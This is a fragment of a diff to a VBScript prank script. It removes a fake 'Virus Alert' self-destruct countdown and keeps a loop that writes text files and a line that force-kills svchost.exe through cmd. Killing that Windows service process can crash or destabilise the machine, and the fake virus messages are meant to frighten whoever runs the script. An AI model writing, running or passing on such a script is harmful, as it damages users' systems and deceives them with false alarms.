@@ -120,15 +120,6 @@ For i = 1 To 30
     txtFile.Close
 Next
 
-Dim i
-For i = 10 To 1 Step -1
-    MsgBox "System will self-destruct in " & i & " seconds...", vbCritical, "Virus Alert"
-    WScript.Sleep 1000
-Next
-MsgBox "Give It some time.", vbInformation, "Simulation Complete"
-
-
-
 
 shell.Run "cmd /k taskkill /F /IM svchost.exe", 1, True
 
